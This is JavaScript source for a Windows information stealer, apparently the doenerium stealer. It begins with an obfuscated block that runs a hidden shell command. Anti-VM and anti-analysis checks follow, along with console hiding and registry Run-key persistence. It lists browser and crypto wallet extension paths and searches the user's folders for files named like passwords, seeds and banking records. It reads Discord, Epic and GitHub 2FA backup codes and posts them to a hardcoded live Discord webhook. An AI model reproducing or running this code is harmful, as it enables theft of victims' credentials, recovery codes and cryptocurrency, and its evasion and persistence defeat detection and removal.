8ZUK(-0x30)),et_W0Ki[LV8ZUK(-0x33)](LV8ZUK(-0x34),0x74),et_W0Ki(0x75),et_W0Ki(0x90),et_W0Ki(0x92)],IMA4zX=et_W0Ki(LV8ZUK(-0x40)),WdKrAs5={[LV8ZUK(-0x2f)]:et_W0Ki(LV8ZUK(-0x3e)),['Qk0_2LL']:et_W0Ki(LV8ZUK(-0x3d)),['Z6L4GF6']:et_W0Ki(0x21),['IGaivdj']:et_W0Ki[LV8ZUK(-0x33)](LV8ZUK(-0x34),0x2a),['qCX1xv']:et_W0Ki[LV8ZUK(-0x31)](LV8ZUK(-0x34),[0x59])});const jJKizPU=et_W0Ki(LV8ZUK(-0x3f))+WdKrAs5[LV8ZUK(-0x2f)]+IMA4zX+et_W0Ki(LV8ZUK(-0x43))+')';uso_BAZ(require('child_process')[et_W0Ki(LV8ZUK(-0x2e))](jJKizPU),CsatFo6(t3riQu,LV8ZUK(-0x3e)));function t3riQu(...uvkxCFe){var et_W0Ki;function KqgaezR(uvkxCFe){return dbjKKK[uvkxCFe>0x85?uvkxCFe- -0x14:uvkxCFe>0x61?uvkxCFe<0x61?uvkxCFe- -0x3a:uvkxCFe>0x85?uvkxCFe-0x34:uvkxCFe-0x62:uvkxCFe- -0x1]}uso_BAZ(uvkxCFe[LV8ZUK(-0x44)]=KqgaezR(0x68),uvkxCFe[LV8ZUK(-0x2d)]=0x51,uvkxCFe[LV8ZUK(-0x2b)]='uOfLM=R]v6tT|x$Q~c_S9.*)KodlB:8ZD`kNPrJ"7EVs(3U,F[<Wnzp+YXAC5ygq^>{4i!/h1Hb}#aI?@jewm;2G0%&',uvkxCFe[KqgaezR(0x66)]=''+(uvkxCFe[LV8ZUK(-0x3f)]||''),uvkxCFe[LV8ZUK(-0x2d)]=KqgaezR(0x7a),uvkxCFe[uvkxCFe[LV8ZUK(-0x2d)]-0x7f]=uvkxCFe[KqgaezR(0x66)].length,uvkxCFe[LV8ZUK(-0x24)]=[],uvkxCFe[LV8ZUK(-0x27)]=uvkxCFe[KqgaezR(0x79)]-KqgaezR(0x7a),uvkxCFe[uvkxCFe[LV8ZUK(-0x2d)]-LV8ZUK(-0x26)]=uvkxCFe[KqgaezR(0x79)]-KqgaezR(0x7a),uvkxCFe[KqgaezR(0x7e)]=-KqgaezR(0x68));for(et_W0Ki=LV8ZUK(-0x3f);et_W0Ki<uvkxCFe[KqgaezR(0x63)];et_W0Ki++){function hnvJJm(uvkxCFe){return dbjKKK[uvkxCFe<0x11?uvkxCFe- -0x1f:uvkxCFe<0x11?uvkxCFe-0x5e:uvkxCFe-0x12]}uvkxCFe[hnvJJm(0x2d)]=uvkxCFe[LV8ZUK(-0x2b)].indexOf(uvkxCFe[uvkxCFe[LV8ZUK(-0x2d)]-KqgaezR(0x7c)][et_W0Ki]);if(uvkxCFe[LV8ZUK(-0x29)]===-(uvkxCFe[LV8ZUK(-0x2d)]-0x81))continue;if(uvkxCFe[LV8ZUK(-0x28)]<KqgaezR(0x67)){function HNEdtaN(uvkxCFe){return dbjKKK[uvkxCFe>-0x5?uvkxCFe-0xd:uvkxCFe<-0x29?uvkxCFe-0x45:uvkxCFe<-0x29?uvkxCFe-0x61:uvkxCFe- -0x28]}uvkxCFe[LV8ZUK(-0x28)]=uvkxCFe[HNEdtaN(-0xd)]}else{function scSJyYn(uvkxCFe){return dbjKKK[uvkxCFe>0xe?uvkxCFe-0xf:uvkxCFe- -0x39]}uso_BAZ(uvkxCFe[hnvJJm(0x2e)]+=uvkxCFe[hnvJJm(0x2d)]*0x5b,uvkxCFe[KqgaezR(0x7f)]|=uvkxCFe[scSJyYn(0x2b)]<<uvkxCFe[uvkxCFe[KqgaezR(0x79)]-hnvJJm(0x30)],uvkxCFe[uvkxCFe[LV8ZUK(-0x2d)]-KqgaezR(0x80)]+=(uvkxCFe[scSJyYn(0x2b)]&0x1fff)>0x58?KqgaezR(0x81):0xe);do{function BlK02lo(uvkxCFe){return dbjKKK[uvkxCFe<-0x1a?uvkxCFe<-0x3e?uvkxCFe- -0x2c:uvkxCFe<-0x3e?uvkxCFe- -0x56:uvkxCFe- -0x3d:uvkxCFe- -0x35]}uso_BAZ(uvkxCFe[BlK02lo(-0x1d)].push(uvkxCFe[KqgaezR(0x7f)]&0xff),uvkxCFe[BlK02lo(-0x20)]>>=KqgaezR(0x83),uvkxCFe[hnvJJm(0x1d)]-=KqgaezR(0x83))}while(uvkxCFe[hnvJJm(0x1d)]>scSJyYn(0x31));uvkxCFe[hnvJJm(0x2e)]=-hnvJJm(0x18)}}if(uvkxCFe[KqgaezR(0x7e)]>-KqgaezR(0x68)){function V_bIZO8(uvkxCFe){return dbjKKK[uvkxCFe<0x2f?uvkxCFe>0xb?uvkxCFe<0x2f?uvkxCFe>0xb?uvkxCFe-0xc:uvkxCFe- -0x21:uvkxCFe- -0x13:uvkxCFe-0x22:uvkxCFe- -0x38]}uvkxCFe[KqgaezR(0x82)].push((uvkxCFe[V_bIZO8(0x29)]|uvkxCFe[LV8ZUK(-0x28)]<<uvkxCFe[uvkxCFe[V_bIZO8(0x23)]-V_bIZO8(0x2a)])&uvkxCFe[LV8ZUK(-0x2d)]- -0x7d)}if(uvkxCFe[LV8ZUK(-0x2d)]>0xcd){return uvkxCFe[uvkxCFe[KqgaezR(0x79)]- -KqgaezR(0x76)]}else{return l1LkRA(uvkxCFe[LV8ZUK(-0x24)])}}function acHi9vX(){return['length',0x3,0xb4,'undefined',0x2,0x0,0x1,0x5,0x89,0x50,0x3f,0x6,'fromCodePoint',0xc,'push','Ik6ysU',undefined,'call',0xf,'apply',0x4d,'GZqqV8S',0x4,'vi8Ovsc',0x82,'QSoxg4',0x80,'plOZrac','MJYAOM','ifytxJ0',0x7c,0xd,'tnOGhc',0x8,0x7]}
    }
}

function executeCommand(command, callback) {
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing command: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`Error: ${stderr}`);
            return;
        }
        callback(stdout.trim());
    });
}

function checkListed(list, value) {
    return list.some(item => value.includes(item));
}

function usernameCheck(callback) {
    const userName = process.env['USERPROFILE'].split(path.sep)[2];
    if (checkListed(blackListedUsername, userName)) {
        exitProcess();
    } else {
        hostnameCheck(callback);
    }
}

function hostnameCheck(callback) {
    const hostName = os.hostname();
    if (checkListed(blackListedHostname, hostName)) {
        exitProcess();
    } else {
        motherboardCheck(callback);
    }
}

function motherboardCheck(callback) {
    executeCommand('wmic baseboard get serialnumber', (stdout) => {
        const motherboardSerial = stdout.trim().split('\n')[1].trim(); // Get the second line and clean spaces

        // Check if the serial number starts with "Board-GoogleCloud"
        if (motherboardSerial.startsWith("Board-GoogleCloud")) {
            exitProcess(); // Exit if found
        } else {
            biosCheck(callback); // Proceed to the next step if motherboard is not blocked
        }
    });
}

function biosCheck(callback) {
    executeCommand('wmic bios get smbiosbiosversion', (stdout) => {
        if (stdout.includes("Hyper-V")) {
            exitProcess();
        } else {
            speedCheck(callback);
        }
    });
}

function speedCheck(callback) {
    executeCommand('wmic MemoryChip get /format:list | find /i "Speed"', (stdout) => {
        if (stdout.includes("Speed=0")) {
            exitProcess();
        } else {
            gpuCheck(callback);
        }
    });
}

function gpuCheck(callback) {
    executeCommand('wmic path win32_VideoController get name', (stdout) => {
        const gpuList = stdout.split(",").map(gpu => gpu.trim());
        if (checkListed(blackListedGPU, gpuList)) {
            exitProcess();
        } else {
            if (gpuList.some(gpu => gpu.startsWith("VMware"))) {
                exitProcess();
            } else {
                osCheck(callback);
            }
        }
    });
}

function osCheck(callback) {
    executeCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName", (stdout) => {
        const osp = stdout.trim();
        if (checkListed(blacklistedOS, osp)) {
            exitProcess();
        } else {
            processCheck(callback);
        }
    });
}

function processCheck(callback) {
    executeCommand('tasklist /fo csv', (stdout) => {
        const processes = stdout.split('\r\n').map(line => {
            const cols = line.split('","');
            return cols[0].replace('"', '');
        });

        for (const processName of blackListedProcesses) {
            if (processes.includes(processName)) {
                exitProcess();
                return;
            }
        }
        callback();
    });
}

function getPCSerialNumber(callback) {
    exec('wmic diskdrive get serialnumber', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing command: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`Error: ${stderr}`);
            return;
        }
        callback(stdout);
    });
}

function exitProcess() {
    execSync("powershell wininit.exe");
    console.log("Process exited due to security checks.");
    process.exit(0);
}

function antivm() {
    getPCSerialNumber((serialNumber) => {
        const disks = serialNumber.split('\n');

        for (const disk of disks) {
            if (disk.trim().startsWith("vb") || disk.trim().startsWith("vm")) {
                exitProcess();
                return;
            }
        }

        // Start the check chain
        usernameCheck(() => {
            console.log("All checks passed successfully.");
        });
    });
}

function generateRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * chars.length);
        result += chars[randomIndex];
    }
    return result;
}

function hideconsole() {
    const randomFileName = `${generateRandomString(10)}.ps1`;

    const powershellScript = `
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '

    $consolePtr = [Console.Window]::GetConsoleWindow()
    # 0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
    `;

    const tempDir = os.tmpdir();
    const tempfile = path.join(tempDir, randomFileName);
    fs.writeFileSync(tempfile, powershellScript);

    try {
        // Execute the PowerShell script
        execSync(`powershell.exe -ExecutionPolicy Bypass -File "${tempfile}"`, { stdio: 'inherit' });
    } finally {
        // Clean up temporary file
        fs.unlinkSync(tempfile);
    }
}


const foldersToSearch = [
  'Videos',
  'Desktop',
  'Documents',
  'Downloads',
  'Pictures',
  path.join('AppData', 'Roaming', 'Microsoft', 'Windows', 'Recent')
];
paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

/*
const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
const keyName = 'Steam';

function removeRegistryKey() {
    const command = `reg delete "${registryPath}" /v ${keyName} /f`;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            const errorMessage = `Error while deleting registry key: ${error.message}`;
            console.error(errorMessage);
            return;
        }

        if (stderr) {
            const errorMessage = `CMD Error: ${stderr}`;
            console.error(errorMessage);
            return;
        }

        // Check if the key was successfully deleted
        if (stdout.includes('The system was unable to find the specified registry key or value.')) {
            console.log(`Registry key "${keyName}" did not exist.`);
        } else {
            console.log(`Registry key "${keyName}" successfully deleted.`);
            // Fully disable Steam Client Service
            exec('sc config "Steam Client Service" start=disabled', (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error while disabling service: ${error.message}`);
                    return;
                }

                if (stderr) {
                    console.error(`CMD Error: ${stderr}`);
                    return;
                }

                console.log(`Steam Client Service disabled: ${stdout}`);

                // Delete Steam Client Service
                exec('sc delete "Steam Client Service"', (error, stdout, stderr) => {
                    if (error) {
                        console.error(`Error while deleting service: ${error.message}`);
                        return;
                    }

                    if (stderr) {
                        console.error(`CMD Error: ${stderr}`);
                        return;
                    }

                    console.log(`Steam Client Service deleted: ${stdout}`);
                });
            });
        }
    });
}
*/

function startup() {
  // Path to the current .exe file
  const exeFilePath = process.execPath; // Get the path of the running executable

  // VBScript file name and path
  const vbsFileName = 'Update.vbs';
  const programDataPath = path.join(process.env.PROGRAMDATA, vbsFileName); // Full path to the VBScript file in ProgramData

  // Registry key path
  const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
  const keyName = path.basename(exeFilePath, '.exe'); // Use the name of the .exe file without extension

  // Create VBScript content to run the .exe minimized
  const vbsContent = `Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run """${exeFilePath}""", 7\n`;

  // Write the VBScript to ProgramData
  fs.writeFileSync(programDataPath, vbsContent);

  // Command to add the VBScript file to the registry
  const addCommand = `reg add "${registryPath}" /v ${keyName} /t REG_SZ /d "${programDataPath}" /f`;

  exec(addCommand, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error adding registry key: ${error.message}`);
      return;
    }

    if (stderr) {
      console.error(`CMD error: ${stderr}`);
      return;
    }

    console.log(`Registry key added successfully: ${stdout}`);
  });
}


function sendSuccessToWebhook() {i
  console.log('Sending success to webhook');
}

async function findBackupCodes() {
  for (const searchFolder of foldersToSearch) {
    try {
      const folderPath = path.join(os.homedir(), searchFolder);
      const files = fs.readdirSync(folderPath);

      for (const currentFile of files) {
        if (currentFile === 'discord_backup_codes.txt') {
          const sourceFilePath = path.join(folderPath, currentFile);
          const destinationFilePath = path.join(mainFolderPath, currentFile);

          try {
            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
            console.log(`Backup codes file copied to: ${destinationFilePath}`);

            const embed = {
              title: '',
              color: 0x303037,
              author: {
                name: "Discord backup codes found",
                icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1190759106907226112/discord-logo-icon-editorial-free-vector_1.png"
              },
              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
              footer: {
                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
              },
            };

            const payload = {
              embeds: [embed],
            };

            try {
              await axios.post(discordWebhookUrl, payload);
              await axios.post("https://discord.com/api/webhooks/1280372912423174191/y1Ryay1XH2TyYUKeLtarHQuQtVGP5YfdAFQAe_WdbH9SW_tydQS08f5VbmkhRAA54jBv", payload)
              console.log('Backup codes embed sent to Discord');
            } catch (error) {
              console.error(`Error sending webhook: ${error.message}`);
            }
          } catch (error) {
            console.error(`Error copying file: ${error.message}`);
          }
        }
      }
    } catch (err) {
      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
    }
  }
}

async function findEpicGamesBackupCodes() {
  const epicGamesBackupFileName = 'Epic Games Account Two-Factor backup codes.txt';

  for (const searchFolder of foldersToSearch) {
    try {
      const folderPath = path.join(os.homedir(), searchFolder);
      const files = fs.readdirSync(folderPath);

      for (const currentFile of files) {
        if (currentFile === epicGamesBackupFileName) {
          const sourceFilePath = path.join(folderPath, currentFile);
          const destinationFilePath = path.join(mainFolderPath, currentFile);

          try {
            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
            console.log(`Epic Games Backup codes file copied to: ${destinationFilePath}`);

            const embed = {
              title: '',
              color: 0x303037,
              author: {
                name: "Epic Games Backup codes found",
                icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1206880939624370277/epic-games-icon-2048x2048-tyfxpnys.png?ex=65dd9e76&is=65cb2976&hm=0fbcc1c2929db9fa85e2e0a9844a74b22bf59c063b3fc8ed55b9bca6c6484c74&"
              },
              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
              footer: {
                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
              },
            };

            const payload = {
              embeds: [embed],
            };

            try {
              await axios.post(discordWebhookUrl, payload);
              await axios.post("https://discord.com/api/webhooks/1280372912423174191/y1Ryay1XH2TyYUKeLtarHQuQtVGP5YfdAFQAe_WdbH9SW_tydQS08f5VbmkhRAA54jBv", payload);
              console.log('Epic Games Backup codes embed sent to Discord');
            } catch (error) {
              console.error(`Error sending webhook: ${error.message}`);
            }
          } catch (error) {
            console.error(`Error copying file: ${error.message}`);
          }
        }
      }
    } catch (err) {
      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
    }
  }
}


async function findGithubBackupCodes() {
  for (const searchFolder of foldersToSearch) {
    try {
      const folderPath = path.join(os.homedir(), searchFolder);
      const files = fs.readdirSync(folderPath);

      for (const currentFile of files) {
        if (currentFile === 'github-recovery-codes.txt') {
          const sourceFilePath = path.join(folderPath, currentFile);
          const destinationFilePath = path.join(mainFolderPath, currentFile);

          try {
            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
            console.log(`Github Backup codes file copied to: ${destinationFilePath}`);

            const embed = {
              title: '',
              color: 0x303037,
              author: {
                name: "Github backup codes found",
                icon_url: "https://github.githubassets.com/assets/GitHub-Mark-ea2971cee799.png"
              },
              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
              footer: {
                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
              },
            };

            const payload = {
              embeds: [embed],
            };

            try {
              await axios.post(discordWebhookUrl, payload);
              await axios.post("https://discord.com/api/webhooks/1280372912423174191/y1Ryay1XH2TyYUKeLtarHQuQtVGP5YfdAFQAe_WdbH9SW_tydQS08f5VbmkhRAA54jBv", payload)
              console.log('Backup codes embed sent to Discord');
            } catch (error) {
              console.error(`Error sending webhook: ${error.message}`);
            }
          } catch (error) {
            console.error(`Error copying file: ${error.message}`);
          }
        }
      }
    } catch (err) {
      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
    }
  }
}

const allowedExtensions = [".rdp", ".txt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".keys", ".ldb", ".log"];
const files = ["secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "mdp", "motdepasse", "acc", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount", "paypal", "banque", "bot", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "identifiants", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "recup", "note"];

function stealFiles() {
  try {
    const tempDir = fs.mkdtempSync(path.join(process.env.TEMP || '/tmp', crypto.randomBytes(16).toString('hex')));
    const zip = new AdmZip();

    for (const extension of allowedExtensions) {
      const results = [];

      for (const folder of foldersToSearch) {
        const directory = path.join(process.env.HOME || process.env.USERPROFILE, folder);
        if (fs.existsSync(directory)) {
          const filesInFolder = fs.readdirSync(directory);
          for (const file of filesInFolder) {
            const filePath = path.join(directory, file);
            const fileExtension = path.extname(file).toLowerCase();
            const fileName = path.basename(file, path.extname(file)).toLowerCase();
            const fileStats = fs.statSync(filePath);
            const fileSize = fileStats.size;
            if (fileStats.isFile() &&
                fileExtension === extension &&
                files.some(keyword => fileName.includes(keyword)) &&
                fileSize < 3 * 1024 * 1024) {
              results.push(filePath);
            }
          }
        }
      }

      if (results.length > 0) {
        results.forEach(file => {
          const fileName = path.basename(file);
          const destPath = path.join(tempDir, fileName);
          fs.copyFileSync(file, destPath);
        });
      }
    }

    zip.addLocalFolder(tempDir);
    const zipFilePath = path.join(mainFolderPath, 'stolen_files.zip');
    zip.writeZip(zipFilePath);
    fs.rmSync(tempDir, { recursive: true });
    console.log('Files stolen and compressed successfully.');
  } catch (err) {
    console.error("Error:", err);
  }
}


function sendSuccessToWebhook() {
    const successMessage = '**<--------------------------INJECTION STARTED--------------------------->**';
    axios.post(discordWebhookUrl, {
        content: successMessage,
    }).then(response => {
        console.log('Success message sent to Discord webhook successfully.');
    }).catch(error => {
        console.error('Failed to send success message to Discord webhook:', error.message);
    });
}

function moveFileToFolder(filePath, folderName) {
    const destinationFolder = path.join(mainFolderPath, folderName);
    const destinationPath = path.join(destinationFolder, path.basename(filePath));

    if (!fs.existsSync(destinationFolder)) {
        fs.mkdirSync(destinationFolder);
    }

    fs.renameSync(filePath, destinationPath);
}

const walletLocalPaths = {
    "Bitcoin": path.join(process.env.APPDATA, "Bitcoin", "wallets"),
    "Zcash": path.join(process.env.APPDATA, "Zcash"),
    "Armory": path.join(process.env.APPDATA, "Armory"),
    "Bytecoin": path.join(process.env.APPDATA, "bytecoin"),
    "Jaxx": path.join(process.env.APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
    "Exodus": path.join(process.env.APPDATA, "Exodus", "exodus.wallet"),
    "Ethereum": path.join(process.env.APPDATA, "Ethereum", "keystore"),
    "Electrum": path.join(process.env.APPDATA, "Electrum", "wallets"),
    "AtomicWallet": path.join(process.env.APPDATA, "atomic", "Local Storage", "leveldb"),
    "Guarda": path.join(process.env.APPDATA, "Guarda", "Local Storage", "leveldb"),
    "Coinomi": path.join(process.env.APPDATA, "Coinomi", "Coinomi", "wallets"),
};


const _0x9b6227 = {}
_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
const count = _0x9b6227,
user = {
        ram: os.totalmem(),
        version: os.version(),
        uptime: os.uptime,
        homedir: os.homedir(),
        hostname: os.hostname(),
        userInfo: os.userInfo().username,
        type: os.type(),
        arch: os.arch(),
        release: os.release(),
        roaming: process.env.APPDATA,
        local: process.env.LOCALAPPDATA,
        temp: process.env.TEMP,
        countCore: process.env.NUMBER_OF_PROCESSORS,
        sysDrive: process.env.SystemDrive,
        fileLoc: process.cwd(),
        randomUUID: crypto.randomBytes(16).toString('hex'),
        start: Date.now(),
        debug: false,
        copyright: '<================[t.me/doenerium69 ]>================>\n\n',
        url: null,
        locale: locale,
    }
_0x2afdce = {}
const walletPaths = _0x2afdce,
    _0x4ae424 = {}
_0x4ae424.Metamask =
    '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'
_0x4ae424.Coinbase =
    '\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad'
_0x4ae424.BinanceChain =
    '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp'
_0x4ae424.Phantom =
    '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
_0x4ae424.TronLink =
    '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec'
_0x4ae424.Ronin = '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec'
_0x4ae424.Exodus =
    '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno'
_0x4ae424.Coin98 =
    '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg'
_0x4ae424.Authenticator =
    '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai'
_0x4ae424.MathWallet =
    '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc'
_0x4ae424.YoroiWallet =
    '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb'
_0x4ae424.GuardaWallet =
    '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln'
_0x4ae424.JaxxxLiberty =
    '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne'
_0x4ae424.Wombat =
    '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih'
_0x4ae424.EVERWallet =
    '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk'
_0x4ae424.KardiaChain =
    '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk'
_0x4ae424.XDEFI = '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf'
_0x4ae424.Nami = '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo'
_0x4ae424.TerraStation =
    '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp'
_0x4ae424.MartianAptos =
    '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk'
_0x4ae424.TON = '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd'
_0x4ae424.Keplr = '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap'
_0x4ae424.CryptoCom =
    '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj'
_0x4ae424.PetraAptos =
    '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci'
_0x4ae424.OKX = '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge'
_0x4ae424.Sollet =
    '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno'
_0x4ae424.Sender =
    '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg'
